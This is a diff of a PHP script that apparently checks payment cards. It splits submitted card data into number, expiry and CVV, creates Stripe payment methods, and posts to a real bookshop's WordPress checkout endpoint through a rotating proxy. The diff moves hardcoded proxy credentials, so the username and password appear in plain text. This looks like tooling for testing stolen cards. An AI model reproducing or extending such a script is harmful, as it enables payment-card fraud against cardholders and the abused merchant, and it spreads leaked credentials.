@@ -1,10 +1,5 @@
 <?php
 
-$username = "g7305bhx467p4yl";
-$password = "ugv0ew3w009j5ii";
-$PROXYSCRAPE_PORT = 6060;
-$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
-
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
@@ -52,6 +47,11 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+$username = "g7305bhx467p4yl";
+$password = "ugv0ew3w009j5ii";
+$PROXYSCRAPE_PORT = 6060;
+$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
+
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -88,6 +88,11 @@ $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 # -------------------- [2 REQ] -------------------#
+
+$username = "g7305bhx467p4yl";
+$password = "ugv0ew3w009j5ii";
+$PROXYSCRAPE_PORT = 6060;
+$PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://alderhousebooks.com/wp-admin/admin-ajax.php?t=1712618145893');
